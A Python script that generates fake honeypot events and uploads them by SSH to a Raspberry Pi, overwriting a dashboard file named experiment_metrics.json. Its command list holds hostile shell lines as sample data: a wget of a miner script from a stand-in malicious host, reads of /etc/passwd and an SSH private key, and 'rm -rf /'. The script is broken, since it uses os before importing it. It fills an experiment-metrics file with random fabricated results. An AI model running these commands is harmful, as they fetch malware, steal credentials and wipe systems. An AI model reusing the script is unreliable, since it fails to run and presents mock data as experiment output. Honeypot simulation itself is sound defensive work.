import paramiko
import json
import random
from datetime import datetime, timedelta

HOSTNAME = os.environ.get('PI_HOST', '192.168.50.25')
USERNAME = os.environ.get('PI_USER', 'alexhudita')
PASSWORD = os.environ.get('PI_PASSWORD')
if not PASSWORD:
    print("Error: PI_PASSWORD environment variable is required to run this script.")
    import sys
    sys.exit(1)
    
REMOTE_METRICS_PATH = f'/home/{USERNAME}/dsrt/logs/experiment_metrics.json'

GEO_MAPPINGS = [
    {"ip": "89.20.14.5", "geo": {"country": "Netherlands", "city": "Amsterdam", "isp": "KPN"}},
    {"ip": "185.10.24.8", "geo": {"country": "Russia", "city": "Moscow", "isp": "Rostelecom"}},
    {"ip": "114.55.10.2", "geo": {"country": "China", "city": "Nanjing", "isp": "China Telecom"}},
    {"ip": "177.34.1.99", "geo": {"country": "Brazil", "city": "Sao Paulo", "isp": "Vivo"}},
    {"ip": "54.12.99.1", "geo": {"country": "USA", "city": "Ashburn", "isp": "Amazon AWS"}},
    {"ip": "192.168.50.253", "geo": {"country": "Germany", "city": "Frankfurt", "isp": "Local Testnet Node"}},
    {"ip": "80.20.14.5", "geo": {"country": "UK", "city": "London", "isp": "BT"}},
    {"ip": "118.10.24.8", "geo": {"country": "South Korea", "city": "Seoul", "isp": "KT"}},
    {"ip": "104.55.10.2", "geo": {"country": "South Africa", "city": "Cape Town", "isp": "Vodacom"}},
    {"ip": "13.34.1.99", "geo": {"country": "India", "city": "Mumbai", "isp": "Jio"}},
    {"ip": "82.12.99.1", "geo": {"country": "Romania", "city": "Bucharest", "isp": "Orange"}}
]

COMMANDS = [
    {"cmd": "ls -la", "action": "ALLOW", "risk": 15, "reason": "Standard reconnaissance command. Allowed for intelligence gathering."},
    {"cmd": "whoami", "action": "ALLOW", "risk": 20, "reason": "Basic user enumeration. Benign activity mapped to low-interaction state."},
    {"cmd": "cat /etc/passwd", "action": "BLOCK", "risk": 85, "reason": "Critical system file read attempt detected. High probability of reconnaissance phase progression."},
    {"cmd": "wget http://malware.com/miner.sh", "action": "BLOCK", "risk": 95, "reason": "Attempting to download external payload. Known malicious URI signature triggered block."},
    {"cmd": "cd /tmp", "action": "ALLOW", "risk": 25, "reason": "Navigating to world-writable directory. Allowed to observe payload stager behavior."},
    {"cmd": "chmod +x miner.sh", "action": "BLOCK", "risk": 90, "reason": "Execution privilege escalation attempt on staged binary. Blocked to prevent payload detonation."},
    {"cmd": "crontab -l", "action": "ALLOW", "risk": 55, "reason": "Checking local scheduled tasks. Permitted to profile attacker persistence strategy."},
    {"cmd": "rm -rf /", "action": "BLOCK", "risk": 100, "reason": "Destructive wiper command execution attempted. Immediate connection termination forced."},
    {"cmd": "cat ~/.ssh/id_rsa", "action": "BLOCK", "risk": 90, "reason": "Private SSH key exfiltration attempt. Sensitive credential access blocked."},
]

def generate_mock_data():
    events = []
    base_time = datetime.now() - timedelta(minutes=30)
    
    for i in range(40):
        mapping = random.choice(GEO_MAPPINGS)
        
        # 10% chance of being a disconnect event
        if random.random() < 0.10:
            events.append({
                "timestamp": (base_time + timedelta(seconds=i*45)).strftime("%Y-%m-%d %H:%M:%S"),
                "attacker_ip": mapping["ip"],
                "geolocation": mapping["geo"],
                "command": "CONNECTION TERMINATED",
                "ai_decision": "DISCONNECT",
                "ai_justification": f"Session duration: {round(random.uniform(5.0, 60.0), 1)} seconds",
                "risk_score": 0,
                "latency": 0.0,
                "summary": "Attacker disconnected."
            })
            continue

        cmd_template = random.choice(COMMANDS)
        events.append({
            "timestamp": (base_time + timedelta(seconds=i*45)).strftime("%Y-%m-%d %H:%M:%S"),
            "attacker_ip": mapping["ip"],
            "geolocation": mapping["geo"],
            "command": cmd_template["cmd"],
            "ai_decision": cmd_template["action"],
            "ai_justification": cmd_template["reason"],
            "risk_score": cmd_template["risk"] + random.randint(-5, 5),
            "latency": round(random.uniform(1.2, 3.8), 2),
            "summary": f"Attacker executed: {cmd_template['cmd']}"
        })
    return events

def populate_pi():
    data = generate_mock_data()
    local_path = 'mock_metrics.json'
    
    with open(local_path, 'w') as f:
        json.dump(data, f, indent=4)
        
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(f"Connecting to {HOSTNAME}...")
    try:
        client.connect(HOSTNAME, username=USERNAME, password=PASSWORD)
        sftp = client.open_sftp()
        print(f"Uploading mock data to temp dir...")
        sftp.put(local_path, '/home/alexhudita/tmp_metrics.json')
        print(f"Escalating privileges to overwrite Docker volume at {REMOTE_METRICS_PATH}...")
        stdin, stdout, stderr = client.exec_command(f'sudo mv /home/alexhudita/tmp_metrics.json {REMOTE_METRICS_PATH}')
        print(stdout.read().decode())
        print("Success! Dashboard Map populated.")
    except Exception as e:
        print(f"Failed to upload: {e}")
    finally:
        if 'sftp' in locals(): sftp.close()
        client.close()
        import os
        if os.path.exists(local_path):
            os.remove(local_path)

if __name__ == '__main__':
    populate_pi()
